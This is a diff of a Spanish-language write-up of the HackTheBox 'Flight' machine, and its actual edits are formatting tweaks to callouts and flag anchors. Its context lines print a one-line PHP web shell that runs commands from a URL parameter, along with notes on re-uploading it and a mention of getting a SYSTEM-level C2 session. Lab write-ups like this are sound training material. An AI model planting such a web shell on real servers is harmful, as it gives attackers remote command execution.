@@ -35,7 +35,7 @@ Bash
 echo "10.129.42.88 flight.htb" | sudo tee -a /etc/hosts
 ```
 
-> [!WARNING] Diferencia Horaria
+> [!warning] Diferencia Horaria
 > 
 > Noté una diferencia horaria de 7 horas con la máquina. Esto es crucial recordarlo, ya que los protocolos de autenticación como Kerberos son sensibles al tiempo y requerirán que sincronice mi reloj más adelante.
 
@@ -186,7 +186,7 @@ PHP
 <?php echo system($_GET['c']); ?>
 ```
 
-> [!NOTE] Persistencia
+> [!note] Persistencia
 > 
 > Los archivos en el servidor web se eliminaban periódicamente, por lo que tuve que volver a subir la web shell varias veces durante el proceso.
 
@@ -339,8 +339,8 @@ Esto me habría proporcionado una sesión de Sliver como `NT AUTHORITY\SYSTEM` d
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
-^bandera
+> [!flag] `flag{user}`
+^bandera-user
 
-> [!FLAG] `flag{root}`
-^bandera
+> [!flag] `flag{root}`
+^bandera-root
